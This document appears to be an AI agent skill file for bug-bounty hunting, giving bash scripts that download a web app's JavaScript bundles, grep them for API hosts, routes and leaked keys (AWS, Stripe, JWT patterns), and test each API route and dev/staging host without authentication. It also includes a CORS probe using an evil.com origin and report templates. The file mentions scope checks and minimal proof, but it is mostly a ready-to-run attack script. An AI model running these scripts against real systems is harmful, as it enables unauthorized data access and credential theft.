---
name: k1nzr3c0n-hunt-spa-api
description: "Hunt SPA hidden API: extract backend routes from JS bundles, test unauthenticated access. SPAs ship full API route map to the browser — auth enforced on gateway but missing on API route groups. Highest-yield modern web play. Pull bundle → grep hosts/routes/keys → establish auth control → test each route unauthenticated → prove missing check."
tags: [spa, api, auth-bypass, js-analysis, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — SPA Hidden API

> **Core insight**: A SPA ships the full map of its backend API to anyone who views source.
> **Login page protected ≠ API protected**. Always test the API directly, unauthenticated.

---

## Phase 0 — When to Use

```bash
echo "=== Trigger conditions ==="
echo "  ✓ Target returns tiny HTML + big /static/js/*.js or /_next/static/* bundles"
echo "  ✓ Subdomain: console, app, dashboard, portal, admin, panel, manage, internal"
echo "  ✓ Any *api*, *-api*, api.* host in recon"
echo "  ✓ Login is OAuth/SSO-gated (tells you nothing about the API behind it)"
echo ""
echo "  DO NOT skip because 'the app needs login' — that's EXACTLY when this pays off"
```

## Phase 1 — Pull Shell + Enumerate Bundles

```bash
TARGET="${TARGET:-console.example.com}"
HUNT="/tmp/hunt_spa_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT/bundles"

echo "=== Pull index + enumerate bundles ==="
curl -s "https://${TARGET}/" -o "$HUNT/index.html"

# React/CRA
grep -oE '/static/js/[^"]+\.js' "$HUNT/index.html" | sort -u
# Next.js
grep -oE '/_next/static/[^"]+\.js' "$HUNT/index.html" | sort -u
# Generic
grep -oiE 'src="[^"]+\.js[^"]*"' "$HUNT/index.html" | grep -oE '"[^"]+"' | tr -d '"' | sort -u

echo ""
echo "Download all bundles:"
grep -oE '/static/js/[^"]+\.js' "$HUNT/index.html" | sort -u | while read JS; do
  FNAME="$HUNT/bundles/$(echo $JS | tr '/' '_')"
  curl -s "https://${TARGET}${JS}" -o "$FNAME"
  echo "  Downloaded: $FNAME ($(wc -c < $FNAME)B)"
done
```

## Phase 2 — Harvest API Hosts, Routes, Secrets

```bash
echo "=== Extract API surface from bundles ==="
B="$HUNT/bundles/*.js"
BASE_DOMAIN="${BASE_DOMAIN:-example.com}"

# Backend API hosts (incl. dev/beta/staging — often weaker auth)
echo "--- API Hosts ---"
grep -ohiE "https://[a-z0-9.-]*(api|console|backend|service|gateway)[a-z0-9.-]*\.${BASE_DOMAIN}[a-z0-9/_-]*" \
  $B 2>/dev/null | sort -u

# Versioned API base paths
echo "--- API Version Paths ---"
grep -ohiE '/api/v[0-9]+/?' $B 2>/dev/null | sort -u

# Route literals (minified bundles store routes as string segments, NOT full URLs)
echo "--- Route Keywords ---"
grep -ohiE '"[a-z0-9_-]+/[a-z0-9_/-]+"' $B 2>/dev/null | tr -d '"' | \
  grep -iE '(login|user|account|order|billing|invoice|payment|deal|report|token|otp|password|reset|admin|profile|auth|upload|export|role|permission|dashboard|wallet|finance|sales|transfer|refund)' | \
  sort -u | head -40

# Secrets in bundle
echo "--- Secrets ---"
grep -ohiE '(AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|sk_live_[0-9A-Za-z]+|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})' \
  $B 2>/dev/null | sort -u
```

## Phase 3 — Establish Auth Control

```bash
echo "=== Establish Control (what 401 looks like) ==="
API_HOST="${API_HOST:-api.${BASE_DOMAIN:-example.com}}"
BASE="https://${API_HOST}"

# Send unauth request to an endpoint you EXPECT to be protected
CONTROL=$(curl -sk -X POST "${BASE}/api/users" \
  -H "Content-Type: application/json" -d '{}')
echo "  Control response: ${CONTROL:0:150}"
echo ""
echo "  Secure: {\"error\":\"Missing or invalid authorization\"} or HTTP 401"
echo "  This is your differential — compare all other routes against this"
```

## Phase 4 — Test Routes Unauthenticated

```bash
echo "=== Test Each Route Family Unauthenticated ==="
API_HOST="${API_HOST:-api.${BASE_DOMAIN:-example.com}}"
BASE="https://${API_HOST}/api/v2"

ROUTES=(
  "users" "users/me" "accounts" "orders" "payments" "billing"
  "invoices" "reports" "export" "admin/users" "roles" "permissions"
  "settings" "config" "dashboard" "analytics" "transfer" "wallet"
)

for ROUTE in "${ROUTES[@]}"; do
  RESP=$(curl -sk -X GET "${BASE}/${ROUTE}" \
    -H "Content-Type: application/json" \
    -w "\nHTTP_CODE:%{http_code}" -o /tmp/spa_resp 2>/dev/null)
  CODE=$(echo "$RESP" | grep -oP 'HTTP_CODE:\K[0-9]+')
  BODY=$(cat /tmp/spa_resp 2>/dev/null)
  
  case "$CODE" in
    200)
      echo "  [UNAUTH 200] /${ROUTE} — DATA: ${BODY:0:80}"
      ;;
    400)
      echo "  [UNAUTH 400] /${ROUTE} — reached business logic without auth: ${BODY:0:80}"
      ;;
    401|403)
      echo "  [GATED $CODE] /${ROUTE} — correctly protected"
      ;;
    *)
      echo "  [$CODE] /${ROUTE}"
      ;;
  esac
done

echo ""
echo "KEY SIGNALS:"
echo "  200 + data → unauthenticated data exposure → CRITICAL"
echo "  400 'field X required' → reached business logic without auth → try supplying field"
echo "  200 + DB/stack error → hit data layer unauthenticated → also SQLi surface"
echo "  Field names: is_admin, is_internal, role_id, account_type → client-supplied privilege"
```

## Phase 5 — Pivot & Prove

```bash
echo "=== Pivot: IDs from one endpoint feed others ==="
echo ""
echo "Collect IDs from public/unauthenticated responses:"
echo "  account_id, order_id, deal_id, invoice_id → test these in other endpoints"
echo ""
echo "Test dev/staging API variants (often weaker auth):"
for PREFIX in dev- beta- staging- internal- old-; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${PREFIX}api.${BASE_DOMAIN:-example.com}/api/users")
  echo "  ${PREFIX}api: $CODE"
done

echo ""
echo "Check CORS on unauthenticated APIs:"
curl -sk "https://${API_HOST:-api.example.com}/api/users" \
  -H "Origin: https://evil.com" -I | grep -i 'access-control' | sed 's/^/  /'

echo ""
echo "STOP at minimum-necessary proof:"
echo "  PoC = a handful of records (or totalCount) proving the missing check"
echo "  DO NOT enumerate the full table — that's beyond minimum necessary PoC"
```

## Gate 0

```bash
echo "=== SPA API Gate 0 ==="
echo "  □ Routes discovered from JS bundle (not guessed)"
echo "  □ Control established (confirmed gated endpoint for comparison)"
echo "  □ Unauthenticated request returns different body than control"
echo "  □ 200 response contains real user/business data (not empty/error)"
echo "  □ Impact: data read, auth bypass, or privilege escalation confirmed"
echo "  □ API host confirmed belongs to target (scope check)"
echo "  □ Only minimum-necessary data extracted for PoC"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Unauthenticated API access on [api.target.com/api/v2/users]: SPA JS bundle reveals route; GET without Authorization header returns 200 + full user PII (name/email/phone) for all 50k accounts — missing auth middleware on /v2/ route group
SPA route [/api/v2/admin/users] accessible unauthenticated: route found in main.chunk.js; returns admin user list including role assignments
```
